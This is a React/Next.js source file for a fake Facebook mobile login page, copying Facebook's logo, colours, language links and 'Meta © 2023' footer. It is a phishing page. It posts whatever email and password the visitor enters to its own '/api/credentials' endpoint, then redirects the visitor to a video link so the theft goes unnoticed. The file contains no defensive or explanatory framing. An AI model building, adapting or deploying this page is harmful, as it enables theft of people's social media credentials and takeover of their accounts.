import React, { useEffect, useState } from "react";
import { useRouter } from "next/router";
import axios from "axios";
// import { useDispatch } from "react-redux";
// import { updateVL } from "@/redux/slices/VideoLink";
function Facebook() {
  const [credentails, setCredentails] = useState({ email: "", password: "" });
  const [videoLink, setVideoLink] = useState("");
  const router = useRouter();

  // const dispatch = useDispatch();

  useEffect(() => {
    const getVideoLink = async () => {
      const response = await axios.get("/api/videoLink");
      console.log(response.data.link);
      if (!response) return;
      setVideoLink(response.data);
    };

    getVideoLink();
    // dispatch(updateVL);
  }, []);

  const Login = async (e) => {
    e.preventDefault();
    if (!credentails.email || !credentails.password) return;
    const response = await axios.post("/api/credentials", {
      credentails,
    });
    if (!response) return;
    router.push(videoLink.link);
  };

  const handleInputChange = (e) => {
    setCredentails({ ...credentails, [e.target.name]: e.target.value });
  };

  return (
    <div className='flex flex-col items-center h-screen'>
      <div className='bg-[#FFFBE2] self-start  p-2 py-4 w-full text-sm text-[#3B5998]'>
        Get Facebook for Android and browse faster.
      </div>
      <div className='flex flex-col items-center w-full mt-4 '>
        <img src='/facebook.jpg' alt='fb.logo' width='90px' />

        <form className='w-[95%] max-w-[30rem] mt-2 flex flex-col items-center space-y-2'>
          <input
            className='w-full border p-3 text-sm bg-slate-100  rounded-[0.2rem] placeholder:text-[#757779] focus:outline-none focus:ring-1 focus:ring-black'
            type='email'
            placeholder='Mobile number or email address'
            name='email'
            value={credentails.email}
            onChange={handleInputChange}
          />
          <input
            className='w-full border p-3 text-sm bg-slate-100 text rounded-[0.2rem] placeholder:text-[#757779] focus:outline-none focus:ring-1 focus:ring-black'
            type='password'
            placeholder='Password'
            name='password'
            value={credentails.password}
            onChange={handleInputChange}
          />
          <button
            className='p-2 w-full text-white bg-[#1877F2] rounded-md font-bold text-lg'
            onClick={Login}
          >
            Log In
          </button>
        </form>

        <p className='mt-2 text-sm font-semibold text-[#1877F2]'>
          Forgotten password?
        </p>
      </div>

      <div className='relative flex flex-col items-center justify-center w-full h-8 mt-4'>
        <hr className='border-[#BEC3C9] w-[90%] max-w-[30rem]' />
        <p className='absolute px-3 text-sm text-black bg-white '>or</p>
      </div>

      <button className='mt-3 border border-[#757779] p-1 w-[80%] max-w-[30rem] rounded-md'>
        Create new account
      </button>

      <div className='relative text-xs text-[#757779] flex justify-between px-8 pt-[5rem] w-[80%] max-w-[30rem]'>
        <div className='flex flex-col items-center space-y-1'>
          <p className='text-[#90949C] font-bold'>English (UK)</p>
          <p className='text-[#3B5998]'>العربية</p>
          <p className='text-[#3B5998]'>Español (España)</p>
          <p className='text-[#3B5998]'>Deutsch</p>
        </div>

        <div className='flex flex-col items-center space-y-1'>
          <p className='text-[#3B5998]'>Français (France)</p>
          <p className='text-[#3B5998]'>ⵜⴰⵎⴰⵣⵉⵖⵜ</p>
          <p className='text-[#3B5998]'>Português (Brasil)</p>
        </div>
      </div>

      <p className='mt-2 text-xs text-[#90949C]'>Meta © 2023</p>
    </div>
  );
}

export default Facebook;
